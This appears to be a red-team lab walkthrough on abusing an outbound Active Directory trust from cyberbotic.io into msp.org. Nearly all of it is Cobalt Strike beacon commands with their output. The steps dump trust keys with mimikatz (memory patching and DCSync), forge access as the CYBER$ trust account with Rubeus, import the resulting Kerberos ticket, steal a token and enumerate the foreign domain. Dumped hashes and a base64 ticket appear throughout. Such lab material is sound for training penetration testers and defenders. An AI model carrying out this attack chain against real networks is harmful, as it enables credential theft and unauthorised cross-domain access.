Remember that if Domain A trusts Domain B, users in Domain B can access resources in Domain A; but users in Domain A should not be able to access resources in Domain B.  If we're in Domain A, then it's by design that we should not be able to access Domain B.  An outbound trust exists between cyberbotic.io and msp.org.  The direction of trust is such that cyberbotic.io trusts msp.org (so users of msp.org can access resources in cyberbotic.io).

  *Because DEV has a trust with CYBER, we can query the trusts that it has by adding the `-Domain` parameter.*

```powershell
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are DEV\bfarmer
```

```powershell
beacon> powerpick Get-DomainTrust -Domain cyberbotic.io
[*] Tasked beacon to run: Get-DomainTrust -Domain cyberbotic.io (unmanaged)
[+] host called home, sent: 10 bytes
[+] host called home, sent: 138048 bytes
[+] received output:


SourceName      : cyberbotic.io
TargetName      : dev.cyberbotic.io
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 8/15/2022 4:00:00 PM
WhenChanged     : 12/19/2023 9:21:31 PM

SourceName      : cyberbotic.io
TargetName      : msp.org
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection  : Outbound
WhenCreated     : 8/16/2022 9:49:17 AM
WhenChanged     : 12/19/2023 9:21:31 PM

```
We can still partially exploit this trust and obtain "domain user" access from CYBER to MSP by leveraging the shared credential for the trust.  Both domains in a trust relationship store a shared password (which is automatically changed every 30 days) in a Trusted Domain Object (TDO).  These objects are stored in the system container and can be read via LDAP.  Here we see that the DC in CYBER has two TDOs for its trusts with DEV and MSP.

```powershell
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection

[*] TOTAL NUMBER OF SEARCH RESULTS: 2
	[+] distinguishedName : CN=dev.cyberbotic.io,CN=System,DC=cyberbotic,DC=io
	[+] name              : dev.cyberbotic.io
	[+] flatName          : DEV
	[+] trustDirection    : 3

	[+] distinguishedName : CN=msp.org,CN=System,DC=cyberbotic,DC=io
	[+] name              : msp.org
	[+] flatName          : MSP
	[+] trustDirection    : 2
```

#### Must be on `dc-1` for this section go to [[2. Parent Child]] if access needed
There are two options for obtaining the key material.  One is to move laterally to the DC itself and dump from memory.

```powershell
beacon> run hostname
dc-1

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> mimikatz lsadump::trust /patch
[*] Tasked beacon to run mimikatz's lsadump::trust /patch command
[+] host called home, sent: 814401 bytes
[+] received output:

Current domain: CYBERBOTIC.IO (CYBER / S-1-5-21-2594061375-675613155-814674916)

Domain: DEV.CYBERBOTIC.IO (DEV / S-1-5-21-569305411-121244042-2357301523)
 [  In ] CYBERBOTIC.IO -> DEV.CYBERBOTIC.IO
    * 12/19/2023 9:21:31 PM - CLEAR   - 74 55 b0 1c 46 34 51 ba c0 0f da 26 83 2d c2 fc bd 08 ea ca 46 9c 02 cf f4 26 e8 b7 b2 8d d5 76 74 21 94 90 4d d3 fd d5 cf 23 04 e8 4b 72 16 cc e0 d9 93 9b 62 9b 32 8b 2e 70 ce 1d c3 cb b7 76 1c 0d 9c 3a 05 5e 49 a0 bc 06 37 3c 2d 46 5d c7 69 f3 a9 b1 b4 f3 a1 a4 ea 31 52 41 23 3f 59 6e 20 38 19 e4 ff 5d 02 3b 62 ee e1 43 7e e6 8d d0 51 ff 5a da 31 7a d0 25 05 61 06 f3 c5 30 92 68 1c 9a 83 db d5 f6 f7 6a ce 7a e0 3b cb 58 51 7b 15 8b 75 17 40 5d d8 ff 6b 56 45 56 bc c0 b8 4f 37 57 ed 3a a7 6e 43 76 69 4b 9b c9 a7 56 4c 3c 7e 6f fc e4 f8 02 6f 9e 19 37 cb cd 5d 08 0d e6 fd f8 95 79 82 66 0a f8 3e 21 ce 0e 2a bc 5a b7 a7 5a c5 1a 69 ba 46 10 78 99 04 00 ad 24 36 94 a7 50 51 d7 2a 53 fd 1c fd 8d a0 86 95 5f a8 19 
	* aes256_hmac       425ab14a859fbe4b119157e06c40b4dae049c3c464e0ee8999c1f702f5c404e7
	* aes128_hmac       103f685f2fd6ce42d096835bbeac3192
	* rc4_hmac_nt       df54780fc24988ebf66d755f486db54c

 [ Out ] DEV.CYBERBOTIC.IO -> CYBERBOTIC.IO
    * 12/19/2023 9:21:30 PM - CLEAR   - eb 19 39 d8 ed 00 83 82 1b c3 ce 89 6c 7b b0 12 bc 6d b2 b4 d8 cc e1 4a 2b 26 cc 95 9a 34 c0 b5 6b 4f 6b c0 04 36 45 cc b2 8f f4 47 9e 48 1c 8b 62 51 da 08 77 bf 4f 2a a6 9e 55 3a 9b f7 0c c0 b6 0c 94 70 c6 1c 16 b9 bf 8a b2 07 78 20 f3 17 b9 27 7b 26 50 44 a6 09 bf 34 51 e2 86 9b ff 14 02 ec 4f f8 a7 b1 53 56 f1 86 8b 57 f4 58 70 a4 08 a5 d9 95 43 b3 a1 47 c4 ae 76 f1 00 eb 2d d4 7a b6 d2 06 9f 9d 9f c5 5f 7d a0 1f b1 82 39 55 3f ef 07 f9 3c d3 be 5e 41 92 f8 5e fa 08 21 4f 8a 65 6d 3a c7 a8 d5 bc aa 38 31 bb 12 92 1f dc 9a d4 d2 0e bd c4 c8 e5 48 64 5c 61 10 b8 eb aa 61 c6 42 80 f3 20 0a 46 af 51 c0 aa 83 1e 59 78 0e 68 5e 4b 4f 24 6f 7e 73 63 ff c6 2e ea 83 7e e3 ef bc 02 11 2a 6b 07 57 98 c4 57 f4 6d 10 c7 
	* aes256_hmac       bef7cf07e5e575b15db86dfbefe8e96950d1f64394f6e59976345de4036abb3a
	* aes128_hmac       d01c396ef6fb657a30d3630f343c3c60
	* rc4_hmac_nt       f8892ea2bceb7ce470a26951dc527133

 [ In-1] CYBERBOTIC.IO -> DEV.CYBERBOTIC.IO
    * 11/2/2023 9:48:48 AM - CLEAR   - 2b 59 5d 82 2a b5 32 ef 55 58 88 f8 e4 79 de e2 32 21 92 df 29 73 8d 1c be da fa 62 32 83 7a f6 a9 75 ef 88 19 49 7c 0f 79 2b 6c c4 f2 20 7a 68 7b 82 96 e0 51 3c 4b 05 a4 57 6a 62 11 fd 30 43 a4 bc 88 4f be 5a d4 1a b8 ad a2 29 31 d2 ee bd 67 4e 3c 95 9d 28 c3 3c 52 fc 00 4f cc 7d f3 46 ac d9 72 6c d9 3a f0 75 7c ba 0f 92 94 2a 7f ee c0 e8 dc 97 75 e3 ed ee 74 c9 92 4d bf 40 b5 58 b5 47 90 cf 96 40 57 c9 f5 19 f9 b0 ed 1f cd 58 e4 62 c1 64 68 d8 4e a5 d7 6c 8c f4 85 5e a9 24 97 78 03 00 59 df 43 88 37 3a da 20 77 7a 75 2c 6c 96 a7 e5 2a ae c3 0d 93 95 1a 68 7d 37 92 d4 ba 90 00 28 80 5b e3 93 ac 9f 7b 78 61 8a 4b 0c 7c f6 3a 88 6d 1f 75 bf c4 1f 4c b0 c3 5e ef b5 3c 81 85 b9 15 86 16 5b 2d 6d b6 6e 9b f1 11 9a 
	* aes256_hmac       43ad3a19ba221d48dffa4dfb0377b3e553347e0af0cff9a0fbc5e017562bf7e8
	* aes128_hmac       950a02c71c2d0626db576673d120e84d
	* rc4_hmac_nt       94df3dfa1d405c85c33548bc2679c474

 [Out-1] DEV.CYBERBOTIC.IO -> CYBERBOTIC.IO
    * 12/19/2023 9:21:30 PM - CLEAR   - f6 82 78 e6 88 30 47 41 49 bb 77 4d d3 21 a5 2e a9 d4 8b e2 a5 29 c9 d5 64 af c7 d6 84 4c d4 ef 2e 7f 2e 6f 6d d3 04 89 f1 f7 7b ec 43 c2 05 ca 63 54 02 aa bf b6 32 c1 84 8b fa a3 79 24 52 f7 cb b0 ed f7 a4 78 73 a7 ba ff e4 12 da b3 ba e8 48 d5 6f 8d e7 a7 8c 31 6f 66 ea 68 f4 77 49 bb 9c d1 fc 1b 93 22 bf 90 b3 e5 90 0b 21 53 72 e6 e2 e4 31 8b 38 13 b5 37 13 30 e7 38 4d 87 2c 06 03 93 29 38 c2 ed e9 71 79 f9 af d1 ff 4e 6b 8e d4 2a cf cb 58 54 73 89 d9 18 b0 53 78 04 bd da c3 a9 88 b3 28 33 0f 87 e0 8b 1e 07 f6 34 e2 21 f8 d6 2c d4 ec 2d 9f 87 fe cb 87 9f 21 c7 56 09 03 2d c1 1f 04 c3 e1 8f e7 71 65 d3 c5 ad ed 85 a7 12 4a f0 bc 63 40 79 c8 a2 b1 8f d0 97 59 4f ee df e7 ef 37 a3 9c 31 af e6 26 28 bc de b5 35 
	* aes256_hmac       5d34ae228371c04c1fa037512065130b1a66fda036b854ca85f54c00b5cc6d2d
	* aes128_hmac       2d3df3b5da27b583aa83e2d92d30ebe0
	* rc4_hmac_nt       7553c5c5244e0ae7df1694c1b94c5217


Domain: MSP.ORG (MSP / S-1-5-21-616357355-3455548143-339820157)
 [  In ] CYBERBOTIC.IO -> MSP.ORG

 [ Out ] MSP.ORG -> CYBERBOTIC.IO
    * 12/19/2023 9:21:31 PM - CLEAR   - 2c f4 00 3d fd 48 a5 60 c2 0c 83 82 5f 27 c6 5a f0 77 fc c5 8a f0 5b 14 0e 00 34 2e 44 65 e6 13 b7 04 ff 32 95 b6 12 77 13 7e 5f ee e9 e6 8f fa ef 70 0f 0a 9c c1 2e 20 3e 38 f2 f5 19 27 41 31 8d c9 b5 a7 61 ab 8c 07 71 d2 21 92 b6 ee 0c 07 3e 13 27 dd 67 c8 a7 86 21 93 6f 2e 2e fa f0 f0 e7 1f 4a 88 32 2b da 79 d6 56 e6 0c aa 2b cd 55 d7 9d 64 86 86 26 e5 d2 15 c6 6c 8f 5f 12 ec 46 67 e8 ac 8f 12 87 90 be 7e ff d1 f3 54 f2 f4 d8 ac 69 6d ba ce 2a 4a 0d fd 47 ba 1f e6 4b f5 3f 80 aa d4 60 13 3b 4c 81 77 15 ab 85 8c a4 34 27 d9 cc b8 18 d3 65 54 25 f3 42 45 b3 78 09 c4 d4 74 b5 e6 20 bf 3f 87 ac a1 f0 46 6e d6 3a 34 d3 18 8c 86 1d a2 7e fa ba 5c ab ff 81 42 a2 17 34 0a 5b 3c b3 c6 4a 38 ce e3 58 30 95 3f cc b3 99 
	* aes256_hmac       e98d1b19c94ea531076730f144ed66d07b52121122ef5dcdbef64d02a19cbe53
	* aes128_hmac       85260be9cf07dac185a9b2cd1096c829
	* rc4_hmac_nt       da52c0d5852c5a0d39ed315618866811

 [ In-1] CYBERBOTIC.IO -> MSP.ORG

 [Out-1] MSP.ORG -> CYBERBOTIC.IO
    * 12/19/2023 9:21:31 PM - CLEAR   - 2a 18 a8 7a 6a 7f 5b cb 1c 03 aa 5a 54 0c 82 f4 45 75 53 e3 85 dc ef 19 e6 4f c3 9f 9c 3c cc 9c 25 14 1a bb ab e2 e7 4d 2a 54 03 1c 7e 1c 63 07 8e 02 e7 c3 c3 38 da 29 e9 50 4e ad 4a a6 81 2d b7 79 a6 c2 6b 45 08 c1 a0 fa 7c 3e ea fd 0e df 63 25 54 c4 b5 8d cc c1 76 91 f0 93 ef 19 b9 30 d8 aa 25 bf b2 13 36 f9 c1 de 5a 8e 7a 98 b5 50 ee 97 2d 3e 71 aa e7 63 99 82 ce 82 18 aa f4 de f6 dd 22 39 70 c5 03 82 d2 8a 7e ca 8f 00 21 af fc 9e 7c 64 5b e5 45 35 0a 69 7d 51 50 e4 59 59 5c ac 5c 9d f5 91 50 ad 5a 55 6b 93 20 7f a0 ce f5 fa be eb 17 bc 5a b2 94 e7 73 16 ea fd 73 9e f6 62 ca 34 8d fe 41 ca 97 fd ab fd 4f b2 2f 0c 0c 69 76 f9 0d 50 22 64 3b ce 13 0e 5e 67 ae d2 36 d5 32 88 b8 7b 44 37 4d 15 5f 02 68 27 42 93 
	* aes256_hmac       c477864f0f80c6087215cb5c12bb6850c0440274f52b9eadd56d62cccfdfddd1
	* aes128_hmac       e4055b7eeffeab5fe74d616936bcf113
	* rc4_hmac_nt       9e952d9bc77cc9203c4a208a8f3ebe58
```
*This performs memory patching, which is very risky, particularly on a domain controller.*

The second is to use DCSync with the TDO's GUID.
Can be completed as `DEV\BFarmer` on `WKSTN-2`
```powershell
beacon> powerpick Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
[*] Tasked beacon to run: Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid (unmanaged)
[+] host called home, sent: 138082 bytes
[+] received output:

objectguid                          
----------                          
b93d2e36-48df-46bf-89d5-2fc22c139b43
```
on `DC-1` utilize the `objectGuid`

```powershell
[12/23 00:29:53] beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
[12/23 00:29:53] [*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43} command
[12/23 00:29:54] [+] host called home, sent: 814403 bytes
[12/23 00:29:55] [+] received output:
[DC] 'cyberbotic.io' will be the domain
[DC] 'dc-1.cyberbotic.io' will be the DC server
[DC] Object with GUID '{b93d2e36-48df-46bf-89d5-2fc22c139b43}'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : msp.org

** TRUSTED DOMAIN - Antisocial **

Partner              : msp.org
 [ Out ] MSP.ORG -> CYBERBOTIC.IO
    * 12/19/2023 9:21:31 PM - CLEAR   - 2c f4 00 3d fd 48 a5 60 c2 0c 83 82 5f 27 c6 5a f0 77 fc c5 8a f0 5b 14 0e 00 34 2e 44 65 e6 13 b7 04 ff 32 95 b6 12 77 13 7e 5f ee e9 e6 8f fa ef 70 0f 0a 9c c1 2e 20 3e 38 f2 f5 19 27 41 31 8d c9 b5 a7 61 ab 8c 07 71 d2 21 92 b6 ee 0c 07 3e 13 27 dd 67 c8 a7 86 21 93 6f 2e 2e fa f0 f0 e7 1f 4a 88 32 2b da 79 d6 56 e6 0c aa 2b cd 55 d7 9d 64 86 86 26 e5 d2 15 c6 6c 8f 5f 12 ec 46 67 e8 ac 8f 12 87 90 be 7e ff d1 f3 54 f2 f4 d8 ac 69 6d ba ce 2a 4a 0d fd 47 ba 1f e6 4b f5 3f 80 aa d4 60 13 3b 4c 81 77 15 ab 85 8c a4 34 27 d9 cc b8 18 d3 65 54 25 f3 42 45 b3 78 09 c4 d4 74 b5 e6 20 bf 3f 87 ac a1 f0 46 6e d6 3a 34 d3 18 8c 86 1d a2 7e fa ba 5c ab ff 81 42 a2 17 34 0a 5b 3c b3 c6 4a 38 ce e3 58 30 95 3f cc b3 99 
	* aes256_hmac       e98d1b19c94ea531076730f144ed66d07b52121122ef5dcdbef64d02a19cbe53
	* aes128_hmac       85260be9cf07dac185a9b2cd1096c829
	* rc4_hmac_nt       da52c0d5852c5a0d39ed315618866811

 [Out-1] MSP.ORG -> CYBERBOTIC.IO
    * 12/19/2023 9:21:31 PM - CLEAR   - 2a 18 a8 7a 6a 7f 5b cb 1c 03 aa 5a 54 0c 82 f4 45 75 53 e3 85 dc ef 19 e6 4f c3 9f 9c 3c cc 9c 25 14 1a bb ab e2 e7 4d 2a 54 03 1c 7e 1c 63 07 8e 02 e7 c3 c3 38 da 29 e9 50 4e ad 4a a6 81 2d b7 79 a6 c2 6b 45 08 c1 a0 fa 7c 3e ea fd 0e df 63 25 54 c4 b5 8d cc c1 76 91 f0 93 ef 19 b9 30 d8 aa 25 bf b2 13 36 f9 c1 de 5a 8e 7a 98 b5 50 ee 97 2d 3e 71 aa e7 63 99 82 ce 82 18 aa f4 de f6 dd 22 39 70 c5 03 82 d2 8a 7e ca 8f 00 21 af fc 9e 7c 64 5b e5 45 35 0a 69 7d 51 50 e4 59 59 5c ac 5c 9d f5 91 50 ad 5a 55 6b 93 20 7f a0 ce f5 fa be eb 17 bc 5a b2 94 e7 73 16 ea fd 73 9e f6 62 ca 34 8d fe 41 ca 97 fd ab fd 4f b2 2f 0c 0c 69 76 f9 0d 50 22 64 3b ce 13 0e 5e 67 ae d2 36 d5 32 88 b8 7b 44 37 4d 15 5f 02 68 27 42 93 
	* aes256_hmac       c477864f0f80c6087215cb5c12bb6850c0440274f52b9eadd56d62cccfdfddd1
	* aes128_hmac       e4055b7eeffeab5fe74d616936bcf113
	* rc4_hmac_nt       9e952d9bc77cc9203c4a208a8f3ebe58
```
`[Out]` and `[Out-1]` are the "new" and "old" passwords respectively (they're the same here because 30 days hasn't elapsed since the creation of the trust).  In most cases, the current [Out] key is the one you want.  In addition, there is also a "trust account" which is created in the "trusted" domain, with the name of the "trusting" domain.  For instance, if we get all the user accounts in the DEV domain, we'll see _CYBER$_ and _STUDIO$_, which are the trust accounts for those respective domain trusts.

on `WKSTN-2` as `DEV\bfarmer` utilize this command
```powershell
[12/23 00:31:51] beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"
[12/23 00:31:55] [*] Tasked beacon to run .NET program: ADSearch.exe --search "(objectCategory=user)"
[12/23 00:31:55] [+] host called home, sent: 486228 bytes
[12/23 00:31:56] [+] received output:

    ___    ____  _____                 __  
   /   |  / __ \/ ___/___  ____ ______/ /_ 
  / /| | / / / /\__ \/ _ \/ __ `/ ___/ __ \
 / ___ |/ /_/ /___/ /  __/ /_/ / /__/ / / /
/_/  |_/_____//____/\___/\__,_/\___/_/ /_/ 
                                           
Twitter: @tomcarver_
GitHub: @tomcarver16
            
[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 

[12/23 00:31:56] [+] received output:
[*] TOTAL NUMBER OF SEARCH RESULTS: 11

[12/23 00:31:56] [+] received output:
	[+] cn : Administrator
	[+] cn : Guest
	[+] cn : krbtgt
																										[+] cn : CYBER$
	[+] cn : Bob Farmer
	[+] cn : John King
	[+] cn : Nina Lamb
	[+] cn : MS SQL Service
	[+] cn : Squid Proxy
																										[+] cn : STUDIO$
	[+] cn : Honey Token

```
This means that the MSP domain will have a trust account called CYBER$, even though we can't enumerate across the trust to confirm it.  This is the account we must impersonate to request Kerberos tickets across the trust.
- utilize the `rc4` hash that is used above in the `[ OUT ]` line, note this hash changes every 30 days

```powershell
[12/23 00:49:03] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:da52c0d5852c5a0d39ed315618866811 /nowrap
[12/23 00:49:08] [*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:da52c0d5852c5a0d39ed315618866811 /nowrap
[12/23 00:49:08] [+] host called home, sent: 550814 bytes
[12/23 00:49:09] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Ask TGT

[*] Using rc4_hmac hash: da52c0d5852c5a0d39ed315618866811
[*] Building AS-REQ (w/ preauth) for: 'msp.org\CYBER$'
[*] Using domain controller: 10.10.151.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFGDCCBRSgAwIBBaEDAgEWooIEPjCCBDphggQ2MIIEMqADAgEFoQkbB01TUC5PUkeiHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB21zcC5vcmejggQAMIID/KADAgESoQMCAQKiggPuBIID6vm5XFSXQ4y69WlChj8sLIipGNvsQuIVwdTP+HQq7zDw6/fRm6BnA7l/qo0ixguzWft6VQT2arrTJzu+rxaUXeJunaQTfoQUvc9pSMfw+9Dg0t1r7WLS0AGUgtlrJgF56SAa68HGQFOip5tZiUUE76feFOBhm44UfHum4P1OE302bFL4HXYFW8uhHRXbAJo48+qEI7rLuvdf24S3p84UCgM2sOMU5gcLN5yexPazhcoTBeXGo50RttNYltN5rO17hDuOzB6JKqTqodc+TI7HCZptwEjJH+E1D43IOsfm+NdDhRs7KyvgenH0Ob7a5QmylmkTxbg9xsFRXzYZGVJ4S97QSN4QZDocIY6zYpvhGD84ooF8kj9LPq4VqEAqOgWgtYPaXQkT+4C08/nWpCwCN7JpZrldAlHS2AIR6N3aDM9iVo6caXkDhCvmMf4tvQg3w0jKes7+3uxM9Jm6M1YxUxNGONA9XT+sg1/Ndtg7EsAlEKluboVPE5egfqQU0tBOqRPnlZjUftUtTF+qiNdVDoD1g0OKV9EtxoU3N+vl4xvWp5/bJYzfguyX9GujtBEmLrf6Kpjw3t3HAltRwu+yhYO9lwGPew7S3INmUbo1nv0DXSGJJI+9x2sjfQIli+BqLzJ3K3R5AMH6Y/D7UlnadamL03a2Tv1NDOxyZH6TiERCh3o6kgxygRlbx+dTSeWEslXMQ1OIAWeoI9As6pahgfo1YPXFPwcsEMWXWLzvC7RImW1tbclmdI6Ke+XRd+tTpaacda7bkQoM/B+uglofEZSTWISmQ/wIbumIjb08zngBx5Em5g7cAPbyHQhlU48CuTqJkLzl9XmCC2r9KecL6pBgZJl/JMvVSn5SsrVnaMKx3rNDuqjjtwll2PN+5dI9kzB/XzYzVD0XBj5uCeE34l88hrphI1qic/4ToWaf1FNNqkxx8Gud513sx0pgvS1gjcXAu5iP3slUlWaDuv9Ke9RvmIGSajQNW0q4aCxKBjfdy8amf9NSHlmaNfEYPxoIt9Mw8QdjPLnl1IcY/f38OQvZHiab39BcFvlsfvMLuRv/WzZejCriNHjxztl6dXJWYjfwG9QCP8b6u9WDIss7HLNI1ORt7rBx2j6WGl5oZKWR7oXo0zFhr/yPrVYsuALSNW3IT2nvToog5zvYSQVIsFySQss/nscRbafCDILCPh02MgKFz9jHYGfGvWT4UGw8N9cYx8DAKsJWMBtPuW9taF1S7xTatY2nGO0+xIpLaiOG8b07ehZ82XeqWS685zA2xEjif0GfSmAyOfj9nnsXOFMTI5/8ZFBldTOX2Y1S0MalsACwSGCBeRH+WqOBxTCBwqADAgEAooG6BIG3fYG0MIGxoIGuMIGrMIGooBswGaADAgEXoRIEEFIZf5IhaVjySaIl1B5OOJWhCRsHTVNQLk9SR6ITMBGgAwIBAaEKMAgbBkNZQkVSJKMHAwUAQOEAAKURGA8yMDIzMTIyMzAwNDkwOVqmERgPMjAyMzEyMjMxMDQ5MDlapxEYDzIwMjMxMjMwMDA0OTA5WqgJGwdNU1AuT1JHqRwwGqADAgECoRMwERsGa3JidGd0Gwdtc3Aub3Jn

  ServiceName              :  krbtgt/msp.org
  ServiceRealm             :  MSP.ORG
  UserName                 :  CYBER$
  UserRealm                :  MSP.ORG
  StartTime                :  12/23/2023 12:49:09 AM
  EndTime                  :  12/23/2023 10:49:09 AM
  RenewTill                :  12/30/2023 12:49:09 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Uhl/kiFpWPJJoiXUHk44lQ==
  ASREP (key)              :  DA52C0D5852C5A0D39ED315618866811

```
import the `ticket` on `dc-1`
```powershell
[12/23 00:51:30] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:CYBER$ /password:FakePass /ticket:doIFGDCCBRSgAwIBBaEDAgEWooIEPjCCBDphggQ2MIIEMqADAgEFoQkbB01TUC5PUkeiHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB21zcC5vcmejggQAMIID/KADAgESoQMCAQKiggPuBIID6vm5XFSXQ4y69WlChj8sLIipGNvsQuIVwdTP+HQq7zDw6/fRm6BnA7l/qo0ixguzWft6VQT2arrTJzu+rxaUXeJunaQTfoQUvc9pSMfw+9Dg0t1r7WLS0AGUgtlrJgF56SAa68HGQFOip5tZiUUE76feFOBhm44UfHum4P1OE302bFL4HXYFW8uhHRXbAJo48+qEI7rLuvdf24S3p84UCgM2sOMU5gcLN5yexPazhcoTBeXGo50RttNYltN5rO17hDuOzB6JKqTqodc+TI7HCZptwEjJH+E1D43IOsfm+NdDhRs7KyvgenH0Ob7a5QmylmkTxbg9xsFRXzYZGVJ4S97QSN4QZDocIY6zYpvhGD84ooF8kj9LPq4VqEAqOgWgtYPaXQkT+4C08/nWpCwCN7JpZrldAlHS2AIR6N3aDM9iVo6caXkDhCvmMf4tvQg3w0jKes7+3uxM9Jm6M1YxUxNGONA9XT+sg1/Ndtg7EsAlEKluboVPE5egfqQU0tBOqRPnlZjUftUtTF+qiNdVDoD1g0OKV9EtxoU3N+vl4xvWp5/bJYzfguyX9GujtBEmLrf6Kpjw3t3HAltRwu+yhYO9lwGPew7S3INmUbo1nv0DXSGJJI+9x2sjfQIli+BqLzJ3K3R5AMH6Y/D7UlnadamL03a2Tv1NDOxyZH6TiERCh3o6kgxygRlbx+dTSeWEslXMQ1OIAWeoI9As6pahgfo1YPXFPwcsEMWXWLzvC7RImW1tbclmdI6Ke+XRd+tTpaacda7bkQoM/B+uglofEZSTWISmQ/wIbumIjb08zngBx5Em5g7cAPbyHQhlU48CuTqJkLzl9XmCC2r9KecL6pBgZJl/JMvVSn5SsrVnaMKx3rNDuqjjtwll2PN+5dI9kzB/XzYzVD0XBj5uCeE34l88hrphI1qic/4ToWaf1FNNqkxx8Gud513sx0pgvS1gjcXAu5iP3slUlWaDuv9Ke9RvmIGSajQNW0q4aCxKBjfdy8amf9NSHlmaNfEYPxoIt9Mw8QdjPLnl1IcY/f38OQvZHiab39BcFvlsfvMLuRv/WzZejCriNHjxztl6dXJWYjfwG9QCP8b6u9WDIss7HLNI1ORt7rBx2j6WGl5oZKWR7oXo0zFhr/yPrVYsuALSNW3IT2nvToog5zvYSQVIsFySQss/nscRbafCDILCPh02MgKFz9jHYGfGvWT4UGw8N9cYx8DAKsJWMBtPuW9taF1S7xTatY2nGO0+xIpLaiOG8b07ehZ82XeqWS685zA2xEjif0GfSmAyOfj9nnsXOFMTI5/8ZFBldTOX2Y1S0MalsACwSGCBeRH+WqOBxTCBwqADAgEAooG6BIG3fYG0MIGxoIGuMIGrMIGooBswGaADAgEXoRIEEFIZf5IhaVjySaIl1B5OOJWhCRsHTVNQLk9SR6ITMBGgAwIBAaEKMAgbBkNZQkVSJKMHAwUAQOEAAKURGA8yMDIzMTIyMzAwNDkwOVqmERgPMjAyMzEyMjMxMDQ5MDlapxEYDzIwMjMxMjMwMDA0OTA5WqgJGwdNU1AuT1JHqRwwGqADAgECoRMwERsGa3JidGd0Gwdtc3Aub3Jn

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Create Process (/netonly)


[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : CYBER$
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4472
[+] Ticket successfully imported!
[+] LUID            : 0x7b0403
```
* Remember that RC4 tickets are used by default across trusts.*

This TGT can now be used to interact with the domain.
Steal Token 4472
```powershell
beacon> steal_token 4472
[*] Tasked beacon to steal token from PID 4472
[+] host called home, sent: 12 bytes
[+] Impersonated NT AUTHORITY\SYSTEM
```
showing the kerb ticket
```powershell
beacon> run klist
[*] Tasked beacon to run: klist
[+] host called home, sent: 23 bytes
[+] received output:

Current LogonId is 0:0x7b0403

Cached Tickets: (1)

#0>	Client: CYBER$ @ MSP.ORG
	Server: krbtgt/msp.org @ MSP.ORG
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
	Start Time: 12/23/2023 0:49:09 (local)
	End Time:   12/23/2023 10:49:09 (local)
	Renew Time: 12/30/2023 0:49:09 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 
```

```powershell
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 143784 bytes
beacon> powerpick Get-Domain -Domain msp.org
[*] Tasked beacon to run: Get-Domain -Domain msp.org (unmanaged)
[+] host called home, sent: 138058 bytes
[+] received output:


Forest                  : msp.org
DomainControllers       : {ad.msp.org}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : ad.msp.org
RidRoleOwner            : ad.msp.org
InfrastructureRoleOwner : ad.msp.org
Name                    : msp.org

```
This account is obviously not a domain admin, but there are multiple abuse primitives that can now be performed across the trust to elevate privileges - including kerberoasting, ASREPRoasting, RBCD, and vulnerable certificate templates.

  As a challenge, try and find a way to get DA in this forest.